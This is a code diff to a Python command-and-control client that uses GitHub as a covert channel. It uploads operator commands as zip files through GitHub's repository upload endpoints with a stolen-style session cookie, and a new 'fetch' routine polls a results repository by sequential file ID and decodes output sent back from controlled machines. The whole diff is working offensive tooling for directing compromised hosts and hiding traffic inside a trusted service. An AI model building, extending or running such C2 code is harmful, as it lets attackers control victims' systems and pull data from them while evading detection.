@@ -1,9 +1,12 @@
+import base64
 import http.client
 import json
 import sys
 import re
 import html
 import configparser
+from urllib.parse import urlparse
+import color
 
 
 c2_github_config = configparser.ConfigParser()
@@ -12,6 +15,7 @@ c2_github_config.read('server.ini')
 # GLOBAL CONFIG
 # COOKIE for example 
 C2_GITHUB_REPO = c2_github_config['github']['c2_github_repo']
+C2_RESULT_REPO = c2_github_config['github']['c2_result_repo']
 C2_GITHUB_ACCOUNT_COOKIE = 'YOUR_GITHUB_COOKIE'
 C2_CLIENT_USER_AGENT = c2_github_config['github']['c2_client_user_agent']
 PROXY_HOST = c2_github_config['github']['proxy_host']
@@ -57,17 +61,16 @@ def scrapeRepoID(html_response):
 def getGithubRepoID(repo_url):
     host = 'github.com'
     path = "/" + repo_url.split('/')[-2] + "/" + repo_url.split('/')[-1]
-    print(path)
     html_response = fetchRepoHtml(host, path)
     repo_json_data = scrapeRepoID(html_response)
     if repo_json_data:
         repo_json_data = json.loads(html.unescape(repo_json_data))
         repo_id = repo_json_data['payload']['repository_id']
-        print("[+] Repo ID Found: ", repo_id)
+        print(color.light_green("[+]") + " Repo ID Found: ", repo_id)
         return repo_id
     else:
         # Add error handling
-        print("[-] Can't Find The Repo ID")
+        print(color.light_red("[-]") + " Can't Find The Repo ID")
         return None
 
 def readTasksFile(task_filename):
@@ -116,7 +119,7 @@ def getUploadPolicy(repository_id, size):
     body = (
         f"--{boundary}\r\n"
         f"Content-Disposition: form-data; name=\"name\"\r\n\r\n"
-        f"test-hassoun.zip\r\n"
+        f"task.zip\r\n"
         f"--{boundary}\r\n"
         f"Content-Disposition: form-data; name=\"size\"\r\n\r\n"
         f"{size}\r\n"
@@ -195,7 +198,7 @@ def uploadFileContent(request_1_response, task):
         f"Content-Disposition: form-data; name=\"Content-Type\"\r\n\r\n"
         f"{request_1_response['form']['Content-Type']}\r\n"
         f"--{boundary}\r\n"
-        f"Content-Disposition: form-data; name=\"file\"; filename=\"test-hassoun.zip\"\r\n"
+        f"Content-Disposition: form-data; name=\"file\"; filename=\"task.zip\"\r\n"
         f"Content-Type: {request_1_response['form']['Content-Type']}\r\n\r\n"
         f"{task}\r\n"
         f"--{boundary}--\r\n"
@@ -248,8 +251,6 @@ def getUploadLink(request_1_response):
     # Convert the body to bytes
     body_bytes = body.encode('utf-8')
     headers['Content-Length'] = str(len(body_bytes))
-
-    print(f"/upload/repository-files/{request_1_response['asset']['id']}")
     # Send the request
     connection.request("PUT", f"/upload/repository-files/{request_1_response['asset']['id']}", body=body_bytes, headers=headers)
     response = connection.getresponse()
@@ -260,10 +261,43 @@ def scheduleTasks(task, task_retrieval_filename, repo_id):
     status, response = getUploadPolicy(repo_id, len(task))
     status_1, response_1 = uploadFileContent(response, task)
     status_2, response_2 = getUploadLink(response)
-    print(f"[+] Task Link: {response_2['href']}")
+    print(color.light_green("[+]") + f" Task Link: {response_2['href']}")
     with open(task_retrieval_filename, 'a') as task_retrieval_filehandler:
         task_retrieval_filehandler.write( response['asset_upload_authenticity_token'] + ':' + response_2['href'] + '\n')
+    return response_2['id']
     
+
+def getTaskResult():
+    
+    task_id = 15100388 # manual for now
+    repo_id_result = getGithubRepoID(C2_RESULT_REPO)
+
+    print("[*] Expecting the next result task id")
+    expected_task_id = scheduleTasks('starting', 'result.txt', repo_id_result)
+    print(expected_task_id)
+
+    while task_id < expected_task_id:
+        current_url = C2_RESULT_REPO + "/files/" + str(task_id) + "/result.zip"
+        parsed_url = urlparse(current_url)
+        connection = http.client.HTTPSConnection(parsed_url.hostname)
+        connection.request("GET", parsed_url.path)
+        response = connection.getresponse()
+
+        if response.status != 404:
+            print(color.light_green("[+]") + f" Fetching Result For Task: {task_id}")
+
+            if response.status in (301, 302, 303, 307, 308):
+                connection = http.client.HTTPSConnection(urlparse(response.headers['Location']).hostname)
+                parsed_url = urlparse(response.headers['Location'])
+                connection.request("GET", parsed_url.path + '?' + parsed_url.query)
+                response = connection.getresponse()
+                data = response.read().decode()
+                connection.close()
+                fetched_result = (base64.b64decode(data)).decode('utf-8')
+                print(color.light_green("[+]"))
+                print(fetched_result)
+        task_id += 1
+
 
 def main():
     repo_id = getGithubRepoID(C2_GITHUB_REPO)
@@ -271,18 +305,19 @@ def main():
         print('github-c2-client> ', end='')
         command = input()
         if command == 'quit' or command == 'exit':
-            print("[~] Shutdown Client")
+            print(color.cyan("[~]") + " Shutdown Client")
             sys.exit(1)
 
         else:
             if command == 'execute':
                 tasks = readTasksFile('task.zip')
-                print(tasks)
                 for task in tasks:
                     scheduleTasks(task, 'scheduled.txt', repo_id)
+            elif command == 'fetch':
+                getTaskResult()
             else:
                 writeTasksFile(command, 'task.zip')
-        print(f"[+] Command Tasked: {command}")
+        print( color.light_green("[+]")+ f" Command Tasked: {command}")
 
 
 if __name__ == '__main__':
